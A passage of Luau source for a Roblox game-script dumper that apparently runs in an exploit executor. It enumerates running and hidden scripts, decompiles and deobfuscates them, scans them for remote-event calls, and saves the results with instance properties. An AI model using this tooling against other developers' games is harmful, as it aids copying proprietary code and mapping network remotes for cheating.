		dbgWarn("FATAL: probe write failed:", err)
		return false
	end
	if readFile then
		local rok, content = pcall(readFile, probeRel)
		dbg("probe readback =>", rok, "bytes=", content and #content or 0)
		if not rok or content ~= stamp then
			dbgWarn("readback failed or mismatch")
			return false
		end
	end
	if listFiles then
		local lok, files = pcall(listFiles, Config.mainDir)
		if lok and type(files) == "table" then
			dbg("listfiles", Config.mainDir, "count=", #files)
		else
			dbgWarn("listfiles failed:", files)
		end
	end
	dbg("disk root:", DISK_ROOT ~= "" and DISK_ROOT or "(executor workspace relative)")
	return true
end

local function instancePath(inst)
	local ok, full = pcall(function()
		return inst:GetFullName()
	end)
	return (ok and full ~= "") and full or tostring(inst)
end

local function replacePlayerName(text)
	if not Config.replaceUsername then
		return text
	end
	return string.gsub(text, LocalPlayer.Name, "LocalPlayer")
end

local function getFullNameForScript(inst)
	local path = replacePlayerName(instancePath(inst))
	local split = string.split(path, ".")
	if inst:IsDescendantOf(game) then
		for i, part in ipairs(split) do
			if string.find(part, "[%s%-]+") then
				split[i] = string.format("['%s']", part)
			end
		end
		local joined = table.concat(split, ".")
		local service = split[1]
		if service then
			joined = string.format('game:GetService("%s")%s', service, string.sub(joined, #service + 1))
			joined = string.gsub(joined, "%.%[", "[")
			return joined
		end
	end
	return path
end

local function finiteNumber(n)
	if type(n) ~= "number" or n ~= n or n == math.huge or n == -math.huge then
		return { type = "nonfinite", representation = tostring(n), lossy = true }
	end
	return n
end

local NIL_UNIQUE_ID = "00000000-0000-0000-0000-000000000000"

local UniqueIdOwner = {}
local function instanceUniqueId(inst)
	local id = nil
	pcall(function()
		id = inst.UniqueId
	end)
	if type(id) == "string" and id ~= "" and id ~= NIL_UNIQUE_ID then
		local owner = UniqueIdOwner[id]
		if owner == nil or owner == inst then
			UniqueIdOwner[id] = inst
			return id
		end
	end
	pcall(function()
		id = inst:GetDebugId()
	end)
	if type(id) == "string" and id ~= "" then
		return "dbg:" .. id
	end
	return nil
end

local function stableIdOf(inst)
	if typeof(inst) ~= "Instance" then
		return nil
	end
	local cached = StableIds[inst]
	if cached then
		return cached
	end
	local uid = instanceUniqueId(inst)
	if uid then
		StableIds[inst] = uid
		return uid
	end
	SessionSeq += 1
	local sid = "sess:" .. string.format("%08x", SessionSeq)
	StableIds[inst] = sid
	return sid
end

local function instanceIdentity(inst)
	local parent = inst.Parent
	return {
		stableId = stableIdOf(inst),
		class = inst.ClassName,
		name = inst.Name,
		path = replacePlayerName(instancePath(inst)),
		parentId = parent and typeof(parent) == "Instance" and stableIdOf(parent) or nil,
	}
end

local PROP_BASEPART = {
	"Anchored", "CanCollide", "CanQuery", "CanTouch", "CastShadow", "CFrame", "Size", "Color",
	"Material", "MaterialVariant", "Reflectance", "Transparency", "Massless", "CollisionGroup",
	"AssemblyLinearVelocity", "AssemblyAngularVelocity",
}
local PROP_MODEL = { "PrimaryPart" }
local PROP_GUIOBJECT = {
	"Visible", "Position", "Size", "AnchorPoint", "Rotation", "ZIndex", "BackgroundColor3",
	"BackgroundTransparency", "BorderSizePixel", "AutomaticSize", "LayoutOrder", "ClipsDescendants",
}
local PROP_TEXT = {
	"Text", "TextColor3", "TextSize", "Font", "TextTransparency", "TextWrapped", "TextScaled",
	"TextXAlignment", "TextYAlignment", "RichText",
}
local PROP_IMAGE = { "Image", "ImageColor3", "ImageTransparency", "ScaleType" }
local PROP_HUMANOID = { "Health", "MaxHealth", "WalkSpeed", "JumpPower", "HipHeight", "AutoRotate" }
local PROP_SOUND = { "SoundId", "Volume", "PlaybackSpeed", "Looped", "Playing", "TimePosition" }
local PROP_VALUE = { "Value" }

local function readPropList(inst, names, out)
	for _, name in ipairs(names) do
		local ok, val = pcall(function()
			return inst[name]
		end)
		if ok then
			out[name] = serializeValue(val)
		end
	end
end

local function noteAsset(kind, contentId, inst)
	if type(contentId) ~= "string" or contentId == "" then
		return
	end
	if contentId == "rbxassetid://0" or contentId == "0" then
		return
	end
	local rec = Assets[contentId]
	if not rec then
		rec = { type = kind, contentId = contentId, referencedBy = {} }
		Assets[contentId] = rec
		Coverage.assets.discovered += 1
	end
	local sid = stableIdOf(inst)
	if sid then
		table.insert(rec.referencedBy, sid)
	end
end

local function collectProperties(inst)
	local out = {}
	local complete = false
	if Config.fullProperties and getPropertiesFn then
		local ok, props = pcall(getPropertiesFn, inst)
		if ok and type(props) == "table" then
			for k, v in pairs(props) do
				if type(k) == "string" and k ~= "Parent" and k ~= "Source" then
					out[k] = serializeValue(v)
				end
			end
			complete = true
		end
	end
	if not complete then
		if inst:IsA("BasePart") then
			readPropList(inst, PROP_BASEPART, out)
		end
		if inst:IsA("Model") then
			readPropList(inst, PROP_MODEL, out)
		end
		if inst:IsA("GuiObject") then
			readPropList(inst, PROP_GUIOBJECT, out)
		end
		if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
			readPropList(inst, PROP_TEXT, out)
		end
		if inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
			readPropList(inst, PROP_IMAGE, out)
		end
		if inst:IsA("Humanoid") then
			readPropList(inst, PROP_HUMANOID, out)
		end
		if inst:IsA("Sound") then
			readPropList(inst, PROP_SOUND, out)
		end
		if inst:IsA("ValueBase") then
			readPropList(inst, PROP_VALUE, out)
		end
		if inst:IsA("Animation") then
			readPropList(inst, { "AnimationId" }, out)
		end
		if inst:IsA("MeshPart") then
			readPropList(inst, { "MeshId", "TextureID" }, out)
		end
		if inst:IsA("Decal") or inst:IsA("Texture") then
			readPropList(inst, { "Texture", "Transparency", "Color3", "Face" }, out)
		end
	end
	pcall(function()
		if inst:IsA("Sound") then
			noteAsset("sound", inst.SoundId, inst)
		elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
			noteAsset("image", inst.Image, inst)
		elseif inst:IsA("Decal") or inst:IsA("Texture") then
			noteAsset("image", inst.Texture, inst)
		elseif inst:IsA("Animation") then
			noteAsset("animation", inst.AnimationId, inst)
		elseif inst:IsA("MeshPart") then
			noteAsset("mesh", inst.MeshId, inst)
			noteAsset("image", inst.TextureID, inst)
		end
	end)
	return out, complete
end

local function fnv1aHex(s)
	local h = 2166136261
	for i = 1, #s do
		h = bit32.bxor(h, string.byte(s, i))
		h = bit32.band(h * 16777619, 0xFFFFFFFF)
	end
	return string.format("%08x", h)
end

local function toHex(s)
	return (string.gsub(s, ".", function(c)
		return string.format("%02x", string.byte(c))
	end))
end

--[=[ serializer ]=]
local function serializeVector3(v)
	return { type = "Vector3", x = finiteNumber(v.X), y = finiteNumber(v.Y), z = finiteNumber(v.Z) }
end
local function serializeVector2(v)
	return { type = "Vector2", x = finiteNumber(v.X), y = finiteNumber(v.Y) }
end
local function serializeColor3(v)
	return { type = "Color3", r = finiteNumber(v.R), g = finiteNumber(v.G), b = finiteNumber(v.B) }
end

serializeValue = function(value, depth, seen, trunc)
	depth = depth or 0
	seen = seen or {}
	trunc = trunc or {}
	if depth > SERIAL_CAPS.depth then
		trunc.depth = true
		return { type = "truncated", reason = "depth" }
	end
	local t = typeof(value)
	if t == "nil" then
		return { type = "nil" }
	elseif t == "boolean" then
		return value
	elseif t == "number" then
		return finiteNumber(value)
	elseif t == "string" then
		if #value > SERIAL_CAPS.stringMax then
			trunc.stringMax = (trunc.stringMax or 0) + 1
			value = string.sub(value, 1, SERIAL_CAPS.stringMax) .. "…"
		end
		return string.gsub(value, "[\0-\31]", "")
	elseif t == "Instance" then
		return {
			type = "Instance",
			class = value.ClassName,
			name = value.Name,
			path = replacePlayerName(instancePath(value)),
			stableId = stableIdOf(value),
			uniqueId = instanceUniqueId(value),
		}
	elseif t == "Vector3" then
		return serializeVector3(value)
	elseif t == "Vector2" then
		return serializeVector2(value)
	elseif t == "Vector3int16" then
		return { type = "Vector3int16", x = value.X, y = value.Y, z = value.Z }
	elseif t == "Vector2int16" then
		return { type = "Vector2int16", x = value.X, y = value.Y }
	elseif t == "CFrame" then
		local x, y, z, r00, r01, r02, r10, r11, r12, r20, r21, r22 = value:GetComponents()
		return {
			type = "CFrame",
			x = finiteNumber(x),
			y = finiteNumber(y),
			z = finiteNumber(z),
			r00 = finiteNumber(r00),
			r01 = finiteNumber(r01),
			r02 = finiteNumber(r02),
			r10 = finiteNumber(r10),
			r11 = finiteNumber(r11),
			r12 = finiteNumber(r12),
			r20 = finiteNumber(r20),
			r21 = finiteNumber(r21),
			r22 = finiteNumber(r22),
		}
	elseif t == "Color3" then
		return serializeColor3(value)
	elseif t == "EnumItem" then
		return {
			type = "EnumItem",
			enum = tostring(value.EnumType),
			name = value.Name,
			value = value.Value,
		}
	elseif t == "UDim" then
		return { type = "UDim", scale = value.Scale, offset = value.Offset }
	elseif t == "UDim2" then
		return {
			type = "UDim2",
			x = { scale = value.X.Scale, offset = value.X.Offset },
			y = { scale = value.Y.Scale, offset = value.Y.Offset },
		}
	elseif t == "Ray" then
		return {
			type = "Ray",
			origin = serializeVector3(value.Origin),
			direction = serializeVector3(value.Direction),
		}
	elseif t == "BrickColor" then
		return { type = "BrickColor", name = value.Name, number = value.Number }
	elseif t == "NumberRange" then
		return { type = "NumberRange", min = value.Min, max = value.Max }
	elseif t == "NumberSequence" then
		local keys = {}
		for i, kp in ipairs(value.Keypoints) do
			keys[i] = { time = kp.Time, value = kp.Value, envelope = kp.Envelope }
		end
		return { type = "NumberSequence", keypoints = keys }
	elseif t == "ColorSequence" then
		local keys = {}
		for i, kp in ipairs(value.Keypoints) do
			keys[i] = { time = kp.Time, value = serializeColor3(kp.Value) }
		end
		return { type = "ColorSequence", keypoints = keys }
	elseif t == "Rect" then
		return {
			type = "Rect",
			min = serializeVector2(value.Min),
			max = serializeVector2(value.Max),
			width = value.Width,
			height = value.Height,
		}
	elseif t == "PhysicalProperties" then
		local row = {
			type = "PhysicalProperties",
			density = value.Density,
			friction = value.Friction,
			elasticity = value.Elasticity,
			frictionWeight = value.FrictionWeight,
			elasticityWeight = value.ElasticityWeight,
		}
		pcall(function()
			row.acousticAbsorption = value.AcousticAbsorption
		end)
		return row
	elseif t == "table" then
		if seen[value] then
			return { type = "cycle" }
		end
		seen[value] = true
		local entries = {}
		local n = 0
		for k, v in pairs(value) do
			n += 1
			if n > SERIAL_CAPS.tableEntries then
				trunc.tableEntries = true
				break
			end
			table.insert(entries, {
				k = serializeValue(k, depth + 1, seen, trunc),
				v = serializeValue(v, depth + 1, seen, trunc),
			})
		end
		seen[value] = nil
		local row = { type = "table", entries = entries }
		if trunc.tableEntries then
			row.truncated = true
		end
		return row
	end
	return {
		type = "unsupported",
		robloxType = t,
		representation = tostring(value),
		lossy = true,
	}
end

toJsonSafe = function(value, depth, seen)
	return serializeValue(value, depth, seen, {})
end

local function compactValue(ser)
	if ser == nil then
		return "nil"
	end
	local ty = typeof(ser)
	if ty == "boolean" or ty == "number" then
		return tostring(ser)
	elseif ty == "string" then
		if #ser > 80 then
			return string.format("%q", string.sub(ser, 1, 80) .. "…")
		end
		return string.format("%q", ser)
	elseif ty ~= "table" then
		return tostring(ser)
	end
	local t = ser.type
	if t == "nil" then
		return "nil"
	elseif t == "truncated" then
		return "…"
	elseif t == "cycle" then
		return "{cycle}"
	elseif t == "Instance" then
		return (ser.class or "Instance") .. ":" .. (ser.path or ser.name or "?")
	elseif t == "Vector3" then
		return string.format("Vector3(%.5g,%.5g,%.5g)", ser.x, ser.y, ser.z)
	elseif t == "Vector2" then
		return string.format("Vector2(%.5g,%.5g)", ser.x, ser.y)
	elseif t == "CFrame" then
		return string.format("CFrame(%.5g,%.5g,%.5g)", ser.x, ser.y, ser.z)
	elseif t == "Color3" then
		return string.format("Color3(%.5g,%.5g,%.5g)", ser.r, ser.g, ser.b)
	elseif t == "EnumItem" then
		return tostring(ser.enum) .. "." .. tostring(ser.name)
	elseif t == "table" then
		return "{…}"
	elseif t == "unsupported" then
		return "unsupported:" .. tostring(ser.robloxType or "?")
	elseif t then
		return t
	end
	return "?"
end

serializeArg = function(value)
	local trunc = {}
	local ser = serializeValue(value, 0, {}, trunc)
	return ser, trunc
end

serializeArgList = function(args, n)
	n = n or #args
	local trunc = {}
	local max = SERIAL_CAPS.argCount
	local out = {}
	for i = 1, math.min(n, max) do
		local ser, t = serializeArg(args[i])
		out[i] = ser
		if t.depth then
			trunc.depth = true
		end
		if t.stringMax then
			trunc.stringMax = true
		end
		if t.tableEntries then
			trunc.tableEntries = true
		end
	end
	if n > max then
		trunc.arguments = n - max
		trunc.argCount = n - max
	end
	local parts = {}
	for i = 1, #out do
		parts[i] = compactValue(out[i])
	end
	if trunc.arguments then
		table.insert(parts, "…+" .. trunc.arguments)
	end
	local types = {}
	for i = 1, math.min(n, max) do
		types[i] = typeof(args[i])
	end
	local complete = trunc.arguments == nil and not trunc.depth and not trunc.stringMax and not trunc.tableEntries
	return out, trunc, table.concat(parts, ", "), types, complete
end

writePhase = function(name, extra)
	if OUT == "" then
		return
	end
	writeText("progress.txt", string.format(
		"phase=%s\nat=%s\nscripts=%d\nwrites_ok=%d\nwrites_fail=%d\n%s",
		name,
		os.date("!%H:%M:%S"),
		ScriptsDumped,
		WriteStats.ok,
		WriteStats.fail,
		extra or ""
	))
	dbg("PHASE", name, extra or "")
end

extractRemoteStrings = function(source, scriptPath, scriptId)
	if type(source) ~= "string" then
		return
	end
	local aliases = {}
	for line in string.gmatch(source, "[^\n]+") do
		local bind, rhs = string.match(line, "local%s+([%w_]+)%s*=%s*(.+)")
		if bind and rhs then
			rhs = string.gsub(rhs, "%s*;?%s*$", "")
			local wfc = string.match(rhs, "WaitForChild%s*%(%s*[\"']([^\"']+)[\"']")
			local idx = string.match(rhs, "%[\"([^\"]+)\"%]") or string.match(rhs, "%['([^']+)'%]")
			local last = string.match(rhs, "([%w_]+)%s*$")
			aliases[bind] = wfc or idx or last
		end
	end
	local lineNo = 0
	local function consider(line)
		local trimmed = string.gsub(line, "^%s+", "")
		if trimmed == "" or string.sub(trimmed, 1, 2) == "--" then
			return
		end
		for _, method in ipairs(STATIC_REMOTE_METHODS) do
			if string.find(line, method, 1, true) then
				local ident = string.match(line, "([%w_]+)%s*:%s*" .. method)
				if not ident then
					ident = string.match(line, '%["([%w_]+)"%]%s*:?%s*' .. method)
				end
				if not ident then
					ident = string.match(line, "%['([%w_]+)'%]%s*:?%s*" .. method)
				end
				if not ident then
					ident = string.match(line, method .. "%s*%(%s*[\"']([^\"']+)[\"']")
				end
				local resolved = ident
				local conf = "low"
				if ident and aliases[ident] then
					resolved = aliases[ident]
					conf = "medium"
				elseif ident then
					conf = "medium"
				end
				local expr = trimmed
				if #expr > 160 then
					expr = string.sub(expr, 1, 160) .. "…"
				end
				table.insert(StaticRemoteRefs, {
					script = scriptPath,
					scriptId = scriptId,
					line = lineNo,
					expression = expr,
					method = method,
					name = resolved,
					alias = ident ~= resolved and ident or nil,
					confidence = conf,
					kind = "text-scan",
				})
			end
		end
	end
	for line in string.gmatch(source, "[^\n]+") do
		lineNo += 1
		consider(line)
	end
	if not string.match(source, "\n$") and lineNo == 0 and #source > 0 then
		lineNo = 1
		consider(source)
	end
end

local function isIgnored(inst)
	if not Config.skipCore then
		return false
	end
	for _, name in ipairs(IGNORED_ANCESTORS) do
		local anc = inst:FindFirstAncestor(name)
		if anc then
			return true
		end
	end
	for _, name in ipairs(IGNORED_NAMES) do
		if inst.Name == name or inst:FindFirstAncestor(name) then
			return true
		end
	end
	return false
end

local function isScript(inst)
	return typeof(inst) == "Instance" and SCRIPT_CLASSES[inst.ClassName] == true
end

local function isNetworkRemote(inst)
	return typeof(inst) == "Instance" and NETWORK_REMOTE_CLASSES[inst.ClassName] == true
end

local function addScript(set, list, inst, sourceTag)
	if not isScript(inst) or isIgnored(inst) then
		return
	end
	local existing = set[inst]
	if existing then
		for _, tag in ipairs(existing.discovery) do
			if tag == sourceTag then
				return
			end
		end
		table.insert(existing.discovery, sourceTag)
		return
	end
	local path = instancePath(inst)
	local sid = stableIdOf(inst)
	local entry = {
		script = inst,
		path = path,
		stableId = sid,
		class = inst.ClassName,
		source = sourceTag,
		discovery = { sourceTag },
		isNil = not inst:IsDescendantOf(game),
	}
	set[inst] = entry
	table.insert(list, entry)
end

local function collectAllScripts()
	local set = {}
	local list = {}
	for _, inst in ipairs(game:GetDescendants()) do
		addScript(set, list, inst, "descendants")
	end
	local apiSources = {
		{ fn = getScripts, tag = "getscripts" },
		{ fn = getRunningScripts, tag = "getrunningscripts" },
		{ fn = getLoadedModules, tag = "getloadedmodules" },
	}
	for _, item in ipairs(apiSources) do
		if item.fn then
			local ok, scripts = pcall(item.fn)
			if ok and type(scripts) == "table" then
				for _, script in ipairs(scripts) do
					addScript(set, list, script, item.tag)
				end
			end
		end
	end
	if Config.includeNil and getNilInstances then
		local ok, nilInsts = pcall(getNilInstances)
		if ok and type(nilInsts) == "table" then
			for _, inst in ipairs(nilInsts) do
				addScript(set, list, inst, "nil")
			end
		end
	end
	return list
end

local function isEmptyDecompile(text)
	if type(text) ~= "string" then
		return true
	end
	local compact = string.lower((string.gsub(text, "%s+", "")))
	if compact == "" then
		return true
	end
	if string.find(compact, "emptybytecode", 1, true) then
		return true
	end
	if string.find(compact, "failedtodecompile", 1, true) then
		return true
	end
	if string.find(compact, "nodecompiler", 1, true) then
		return true
	end
	return false
end

local function tryCallDecompile(target)
	if not decompileFn or target == nil then
		return nil
	end
	local output = nil
	local ok = pcall(function()
		output = decompileFn(target)
	end)
	if ok and not isEmptyDecompile(output) then
		return output
	end
	return nil
end

local function decompileScript(scriptInst, bytecodeBlob)
	if not decompileFn then
		return nil, "no decompiler"
	end
	local hash = nil
	if getScriptHash then
		pcall(function()
			hash = getScriptHash(scriptInst)
		end)
	end
	if hash and DecompileCache[hash] then
		return DecompileCache[hash], "cache"
	end
	local output = tryCallDecompile(scriptInst)
	if not output and type(bytecodeBlob) == "string" and #bytecodeBlob > 0 then
		output = tryCallDecompile(bytecodeBlob)
	end
	if not output and getScriptClosure then
		local cok, closure = pcall(getScriptClosure, scriptInst)
		if cok and type(closure) == "function" then
			output = tryCallDecompile(closure)
		end
	end
	if not output then
		return nil, "decompile failed"
	end
	if hash then
		DecompileCache[hash] = output
	end
	return output, "decompiled"
end

local LUAU_RESERVED = {
	["and"] = true,
	["break"] = true,
	["do"] = true,
	["else"] = true,
	["elseif"] = true,
	["end"] = true,
	["false"] = true,
	["for"] = true,
	["function"] = true,
	["if"] = true,
	["in"] = true,
	["local"] = true,
	["nil"] = true,
	["not"] = true,
	["or"] = true,
	["repeat"] = true,
	["return"] = true,
	["then"] = true,
	["true"] = true,
	["until"] = true,
	["while"] = true,
	["continue"] = true,
	["export"] = true,
	["type"] = true,
}

local function isAnonIdent(id)
	return string.match(id, "^[uv]%d+$") ~= nil
end

local function identFromString(raw)
	raw = tostring(raw or "")
	raw = string.gsub(raw, "[^%w_]", "")
	if raw == "" or tonumber(raw) ~= nil or LUAU_RESERVED[raw] then
		return nil
	end
	if not string.match(raw, "^[%a_]") then
		raw = "_" .. raw
	end
	if not isAnonIdent(raw) and #raw <= 60 then
		return raw
	end
	return nil
end

local function parkLiterals(src)
	local holes = {}
	local out = {}
	local i = 1
	local n = #src
	local function sub(a, b)
		return string.sub(src, a, b)
	end
	local function park(a, b)
		table.insert(holes, sub(a, b))
		table.insert(out, "\1" .. tostring(#holes) .. "\1")
	end
	while i <= n do
		local c = sub(i, i)
		local nxt = i < n and sub(i + 1, i + 1) or ""
		if c == "-" and nxt == "-" then
			local long = string.match(sub(i + 2), "^%[(=*)%[")
			if long then
				local close = "]" .. long .. "]"
				local j = string.find(src, close, i + 2 + #long + 1, true)
				if j then
					park(i, j + #close - 1)
					i = j + #close
				else
					park(i, n)
					break
				end
			else
				table.insert(out, "--")
				i += 2
			end
		elseif c == "[" then
			local eqs = string.match(sub(i), "^%[(=*)%[")
			if eqs then
				local close = "]" .. eqs .. "]"
				local j = string.find(src, close, i + 2 + #eqs, true)
				if j then
					park(i, j + #close - 1)
					i = j + #close
				else
					table.insert(out, c)
					i += 1
				end
			else
				table.insert(out, c)
				i += 1
			end
		elseif c == '"' or c == "'" or c == "`" then
			local j = i + 1
			while j <= n do
				local d = sub(j, j)
				if d == "\\" then
					j += 2
				elseif d == c then
					j += 1
					break
				else
					j += 1
				end
			end
			park(i, j - 1)
			i = j
		else
			table.insert(out, c)
			i += 1
		end
	end
	return table.concat(out), holes
end

local function unparkLiterals(src, holes)
	return (string.gsub(src, "\1(%d+)\1", function(idx)
		return holes[tonumber(idx)] or ""
	end))
end

local function uniqueIdent(base, taken)
	if not taken[base] then
		taken[base] = true
		return base
	end
	local n = 2
	while taken[base .. "_" .. n] do
		n += 1
	end
	local name = base .. "_" .. n
	taken[name] = true
	return name
end

local function collectRenameMap(src, scriptName)
	local proposed = {}
	local function propose(id, name)
		if not isAnonIdent(id) then
			return
		end
		local ident = identFromString(name)
		if ident then
			proposed[id] = ident
		end
	end
	for id, name in string.gmatch(src, "local%s+([uv]%d+)%s*=%s*game:GetService%(\"([%w]+)\"%)") do
		propose(id, name)
	end
	for id, name in string.gmatch(src, "local%s+([uv]%d+)%s*=%s*Instance%.new%(\"([%w]+)\"%)") do
		propose(id, name)
	end
	for id, name in string.gmatch(src, "([uv]%d+)%s*=%s*[%w%.:]+:WaitForChild%(\"([%w_]+)\"%)") do
		propose(id, name)
	end
	for id, name in string.gmatch(src, "local%s+([uv]%d+)%s*=%s*require%([^;]-WaitForChild%(\"([%w_]+)\"%)") do
		propose(id, name)
	end
	for id, name in string.gmatch(src, "([uv]%d+)%._name%s*=%s*\"([%w_]+)\"") do
		propose(id, name)
	end
	for id, block in string.gmatch(src, "local%s+([uv]%d+)%s*=%s*(%b{})") do
		local className = string.match(block, "ClassName%s*=%s*\"([%w_]+)\"")
		local typeName = string.match(block, "_name%s*=%s*\"([%w_]+)\"")
		propose(id, className or typeName)
	end
	for id, name in string.gmatch(src, "getmetatable%(([uv]%d+)%)%.__tostring%s*=%s*function%s*%(%s*%)[^\n]*\n%s*return%s*\"([^\"]+)\"") do
		propose(id, name)
	end
	for fname, id in string.gmatch(src, "function%s+([%w_]+)%s*%([^)]*%)[^f]-\n%s*return%s+([uv]%d+)%[") do
		if string.find(fname, "Controller", 1, true) then
			propose(id, "Controllers")
		elseif string.find(fname, "Service", 1, true) then
			propose(id, "Services")
		end
	end
	local ret = string.match(src, "return%s+([uv]%d+)%s*;?%s*$")
	if ret and scriptName then
		propose(ret, scriptName)
	end
	local taken = {
		game = true,
		script = true,
		workspace = true,
		plugin = true,
		shared = true,
		_G = true,
	}
	for id in string.gmatch(src, "[_%a][_%w]*") do
		if not proposed[id] then
			taken[id] = true
		end
	end
	for word in pairs(LUAU_RESERVED) do
		taken[word] = true
	end
	local map = {}
	local keys = {}
	for id in pairs(proposed) do
		table.insert(keys, id)
	end
	table.sort(keys, function(a, b)
		return #a > #b
	end)
	for _, id in ipairs(keys) do
		map[id] = uniqueIdent(proposed[id], taken)
	end
	return map
end

local function foldStringChar(src)
	local n = 0
	local out = string.gsub(src, "string%.char%(([%d%s,]+)%)", function(body)
		local chars = {}
		for num in string.gmatch(body, "%d+") do
			local v = tonumber(num)
			if not v or v < 32 or v > 126 then
				return "string.char(" .. body .. ")"
			end
			table.insert(chars, string.char(v))
		end
		if #chars == 0 then
			return "string.char(" .. body .. ")"
		end
		n += 1
		return string.format("%q", table.concat(chars))
	end)
	return out, n
end

local function collectScriptConstants(scriptInst)
	local constants = nil
	if not getScriptClosure or not getConstants then
		return nil
	end
	local ok, closure = pcall(getScriptClosure, scriptInst)
	if not ok or type(closure) ~= "function" then
		return nil
	end
	local cok, consts = pcall(getConstants, closure)
	if cok and type(consts) == "table" then
		constants = consts
	end
	return constants
end

local function missingConstantComments(src, constants)
	if type(constants) ~= "table" or type(src) ~= "string" then
		return "", 0
	end
	local lines = { "", "-- unrecovered string constants (not present in decompiled text):" }
	local n = 0
	for _, c in ipairs(constants) do
		if type(c) == "string" and #c >= 4 and #c <= 200 and not string.find(src, c, 1, true) then
			n += 1
			if n <= 80 then
				table.insert(lines, "--   " .. string.format("%q", c))
			end
		end
	end
	if n == 0 then
		return "", 0
	end
	if n > 80 then
		table.insert(lines, string.format("--   … %d more", n - 80))
	end
	return table.concat(lines, "\n"), n
end

local function deobfuscateSource(source, scriptInst)
	local stats = { renamed = 0, foldedChars = 0, missingConstants = 0 }
	if type(source) ~= "string" or source == "" then
		return source, stats
	end
	source = string.gsub(source, "^%-%- Decompiled with [^\n]+\n+", "")
	source, stats.foldedChars = foldStringChar(source)
	if not Config.deobfuscate then
		return source, stats
	end
	local map = collectRenameMap(source, scriptInst and scriptInst.Name)
	local parked, holes = parkLiterals(source)
	local renamed = 0
	local keys = {}
	for id in pairs(map) do
		table.insert(keys, id)
	end
	table.sort(keys, function(a, b)
		return #a > #b
	end)
	for _, id in ipairs(keys) do
		local count
		parked, count = string.gsub(parked, "%f[%w_]" .. id .. "%f[^%w_]", map[id])
		renamed += count
	end
	source = unparkLiterals(parked, holes)
	stats.renamed = renamed
	local constants = collectScriptConstants(scriptInst)
	local extra
	extra, stats.missingConstants = missingConstantComments(source, constants)
	if extra ~= "" then
		source ..= extra
	end
	return source, stats, constants
end

local function assessConfidence(scriptInst, source, status, bytecodeAvailable)
	local syntax = "n/a"
	local constCount, protoCount = nil, nil
	local constantsMatch = nil
	local protoCountMatch = nil
	local reconstructionScore = 0
	local hasSource = status == "decompiled" or status == "cache"
	if hasSource then
		local loadFn = loadstring or load
		if type(loadFn) == "function" and type(source) == "string" then
			local okLoad = pcall(loadFn, source)
			syntax = okLoad and "valid" or "invalid"
		else
			syntax = "unknown"
		end
		if syntax == "valid" then
			reconstructionScore += 35
		elseif syntax == "invalid" then
			reconstructionScore += 5
		end
		reconstructionScore += 20
	end
	if bytecodeAvailable then
		reconstructionScore += 10
	end
	local constants = nil
	if getScriptClosure then
		local ok, closure = pcall(getScriptClosure, scriptInst)
		if ok and type(closure) == "function" then
			if getConstants then
				local cok, consts = pcall(getConstants, closure)
				if cok and type(consts) == "table" then
					constants = consts
					constCount = #consts
				end
			end
			if getProtos then
				local pok, protos = pcall(getProtos, closure)
				if pok and type(protos) == "table" then
					protoCount = #protos
				end
			end
		end
	end
	if hasSource and type(source) == "string" then
		if protoCount then
			local fnCount = 0
			for _ in string.gmatch(source, "function") do
				fnCount += 1
			end
			protoCountMatch = math.abs(fnCount - protoCount) <= 1
			if protoCountMatch then
				reconstructionScore += 20
			else
				reconstructionScore += 5
			end
		end
		if constants then
			local checked, matched = 0, 0
			for _, c in ipairs(constants) do
				if type(c) == "string" and #c >= 4 then
					checked += 1
					if string.find(source, c, 1, true) then
						matched += 1
					end
				end
			end
			if checked > 0 then
				constantsMatch = matched / checked
				if constantsMatch >= 0.7 then
					reconstructionScore += 20
				elseif constantsMatch >= 0.3 then
					reconstructionScore += 10
				end
			end
		end
	end
	if reconstructionScore > 100 then
		reconstructionScore = 100
	end
	local confidence = "LOW"
	if reconstructionScore >= 80 and syntax == "valid" and (constantsMatch == nil or constantsMatch >= 0.7) then
		confidence = "HIGH"
	elseif reconstructionScore >= 45 then
		confidence = "MEDIUM"
	end
	if status == "bytecode" or status == "timeout" or status == "decompile failed" then
		confidence = "LOW"
	end
	return {
		decompile = status,
		syntax = syntax,
		syntacticValid = syntax == "valid",
		bytecodePresent = bytecodeAvailable == true,
		constants = constCount,
		protos = protoCount,
		constantsMatch = constantsMatch,
		protoCountMatch = protoCountMatch,
		reconstructionScore = reconstructionScore,
		confidence = confidence,
		elapsed = nil,
	}
end

local function scriptPipeline(status, syntax, bytecodeAvailable)
	local sourceAvailable = status == "decompiled" or status == "cache"
	local decompileAttempted = status ~= "skipped"
	local validation = "n/a"
	if syntax == "valid" then
		validation = "passed"
	elseif syntax == "invalid" then
		validation = "failed"
	end
	return {
		discovered = true,
		identified = true,
		sourceAvailable = sourceAvailable,
		bytecodeAvailable = bytecodeAvailable == true,
		decompileAttempted = decompileAttempted,
		validated = syntax == "valid",
		validation = validation,
	}
end

local function buildDebugBlock(scriptInst)
	if not Config.dumpDebug then
		return ""
	end
	local lines = { "", "-- Debug Info" }
	if not getScriptClosure then
		table.insert(lines, "-- (getscriptclosure unavailable)")
		return table.concat(lines, "\n")
	end
	local ok, closure = pcall(getScriptClosure, scriptInst)
	if not ok or type(closure) ~= "function" then
		table.insert(lines, "-- (could not get script closure)")
		return table.concat(lines, "\n")
	end
	if getConstants then
		local cok, constants = pcall(getConstants, closure)
		if cok and type(constants) == "table" then
			table.insert(lines, "-- # Constants: " .. tostring(#constants))
			if Config.detailedDebug then
				for i, value in ipairs(constants) do
					if i > 200 then
						table.insert(lines, "-- … truncated")
						break
					end
					table.insert(lines, string.format("-- [%d] (%s) %s", i, typeof(value), tostring(value)))
				end
			end
		end
	end
	if getProtos then
		local pok, protos = pcall(getProtos, closure)
		if pok and type(protos) == "table" then
			table.insert(lines, "-- # Protos: " .. tostring(#protos))
		end
	end
	return table.concat(lines, "\n")
end

local function contentHash(scriptInst, source, bytecode)
	local raw = nil
	if getScriptHash then
		pcall(function()
			raw = getScriptHash(scriptInst)
		end)
	end
	if type(raw) == "string" and raw ~= "" then
		if string.match(raw, "^[0-9a-fA-F]+$") then
			return string.lower(raw)
		end
		if #raw <= 64 then
			return toHex(raw)
		end
		return fnv1aHex(raw)
	end
	if type(source) == "string" and source ~= "" then
		return "src_" .. fnv1aHex(source)
	end
	if type(bytecode) == "string" and bytecode ~= "" then
		return "bc_" .. fnv1aHex(bytecode)
	end
	return "inst_" .. fnv1aHex(stableIdOf(scriptInst) or "")
end

local function scriptStem(name, hash)
	local short = string.lower(string.sub(tostring(hash), 1, 8))
	local base = safePathSegment(name)
